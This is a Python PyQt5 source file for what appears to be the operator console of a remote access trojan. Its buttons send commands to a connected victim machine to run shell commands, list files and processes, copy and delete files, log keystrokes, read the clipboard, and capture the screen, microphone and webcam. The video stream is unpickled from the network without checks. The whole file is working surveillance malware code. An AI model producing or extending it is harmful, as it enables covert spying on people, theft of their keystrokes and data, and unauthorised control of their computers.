from datetime import datetime
import struct
import cv2
import pickle
from PyQt5.QtWidgets import (QLineEdit, QWidget, 
                             QPushButton, QToolTip, 
                             QLabel, QVBoxLayout)
from PyQt5.QtGui import QFont
from .connectionModule import (wait_for_connection, get_file_and_write,
                               send_string_into_connection, read_string_from_connection)


class Server(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
         
    def initUI(self):
        QToolTip.setFont(QFont('SansSerif', 10))
        self.setToolTip('Server')

        main_layout = QVBoxLayout()
        button_layout = QVBoxLayout()
        control_layout = QVBoxLayout()

        button_data = [
            ('System Information', self.gather_system_info),
            ('CMD', self.command_line_interface),
            ('File And Directory Discovery', self.file_and_directory_discovery),
            ('Remote File Copy', self.remote_file_copy),
            ('File Deletion', self.file_deletion),
            ('Process Discovery', self.process_discovery),
            ('Input Capture', self.input_capture),
            ('Clipboard Data', self.clipboard_data),
            ('Screen Capture', self.screen_capture),
            ('Audio Capture', self.audio_capture),
            ('Video Capture', self.video_capture),
            ('Stop', self.stop), 
            ('Listen', self.establish_connection)
        ]

        for text, function in button_data:
            button = QPushButton(text)
            button.clicked.connect(function)

            button.setStyleSheet("QPushButton {"
                                 "   background-color: #4CAF50;"
                                 "   color: white;"
                                 "   border: 1px solid #4CAF50;"
                                 "   border-radius: 4px;"
                                 "   padding: 5px;"
                                 "   min-width: 100px;"
                                 "}"
                                 "QPushButton:hover {"
                                 "   background-color: #45a049;"
                                 "   border: 1px solid #45a049;"
                                 "}"
                                 "QPushButton:pressed {"
                                 "   background-color: #3c883b;"
                                 "   border: 1px solid #3c883b;"
                                 "}")

            button_layout.addWidget(button)

        self.TextBox = QLineEdit()
        self.label = QLabel("There is would be your program feedback")

        self.TextBox.setStyleSheet("QLineEdit {"
                                  "   background-color: #ffffff;"
                                  "   border: 1px solid #4CAF50;"
                                  "   padding: 5px;"
                                  "}")

        self.label.setStyleSheet("QLabel {"
                                 "   color: #4CAF50;"
                                 "}")

        control_layout.addWidget(self.TextBox)
        control_layout.addWidget(self.label)

        main_layout.addLayout(button_layout)
        main_layout.addLayout(control_layout)

        self.setLayout(main_layout)

        self.setStyleSheet("QWidget {"
                           "   background-color: #f0f0f0;"
                           "}")

        self.setGeometry(300, 300, 800, 600)
        self.setWindowTitle('Server')
        self.show()


    def establish_connection(self):
        try:
            self.connection, self.address = wait_for_connection(int(self.TextBox.text()))
            self.label.setText(f"Got connection from {self.address[0]}:{self.address[1]}")
            self.operation_system = self.connection.recv(1).decode()
            self.label.setText(f"Os is: {self.operation_system}")
        except Exception as e:
            pass

    def gather_system_info(self):
        self.connection.send(b"1")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "sys_info" + date + ".txt")
        self.label.setText("You have sysinfo in sysinfo.txt")
        
    def command_line_interface(self):
        self.connection.send(b"2")
        send_string_into_connection(self.connection, self.TextBox.text())
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "cmd_output_" + self.TextBox.text() + "_" + date + "_.txt")
        self.label.setText("You have cmd output in cmd_output_command_datetime.txt")
        self.label.resize(self.label.sizeHint())

    def file_and_directory_discovery(self):
        self.connection.send(b"3")
        date = str(datetime.now()).replace(":", "")
        filename = "FileAndDirectoryDiscovery" + date + ".txt"
        get_file_and_write(self.connection, filename)
        self.label.setText("You have an output in " + filename)
        self.label.resize(self.label.sizeHint())  

    def remote_file_copy(self):
        self.connection.send(b"4")
        filename = self.TextBox.text()
        send_string_into_connection(self.connection, filename)
        get_file_and_write(self.connection, filename.split("/")[-1])
        self.label.setText("success") 

    def file_deletion(self):
        self.connection.send(b"5")
        filename = self.TextBox.text()
        send_string_into_connection(self.connection, filename)
        self.label.setText("success") 

    def process_discovery(self):
        self.connection.send(b"6")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "ProcessDiscovery_output" + date + ".txt")
        self.label.setText("You have an output in " + "ProcessDiscovery_output" + date + ".txt")
        self.label.resize(self.label.sizeHint())

    def input_capture(self):
        self.connection.send(b"7")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "keylogger " + date + ".txt")
        self.label.setText("You have an output in " + "keylogger " + date + ".txt")
        self.label.resize(self.label.sizeHint())

    def clipboard_data(self):
        self.connection.send(b"8")
        res = read_string_from_connection(self.connection)
        self.label.setText(res)
        self.label.resize(self.label.sizeHint())

    def screen_capture(self):
        self.connection.send(b"9")
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "screenshot" + date + ".png")
        self.label.setText("You have an screenshot in " + "screenshot" + date + ".png")
        self.label.resize(self.label.sizeHint())

    def audio_capture(self):
        self.connection.send(b"A")
        seconds_to_record = str(self.TextBox.text())
        send_string_into_connection(self.connection, seconds_to_record)
        date = str(datetime.now()).replace(":", "")
        get_file_and_write(self.connection, "AudioCapture_" + date + "_.wav")
        self.label.setText("You have audiocapture of " + str(seconds_to_record) + "seconds" +" in " + "record" + date + ".png")
        self.label.resize(self.label.sizeHint())

    def video_capture(self):
        self.connection.send(b"B")
        data = b''
        size = struct.calcsize("L")
        while True:
            self.connection.send(b"continue")
            while len(data) < size:
                data += self.connection.recv(4096)
            packed_msg_size = data[:size]
            data = data[size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]
            while len(data) < msg_size:
                data += self.connection.recv(4096)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow('frame', frame)
            if cv2.waitKey(1) & 0xFF == ord('x'):
                self.connection.send(b"stop")
                break
        cv2.destroyAllWindows()

    def stop(self):
        self.connection.send(b"S")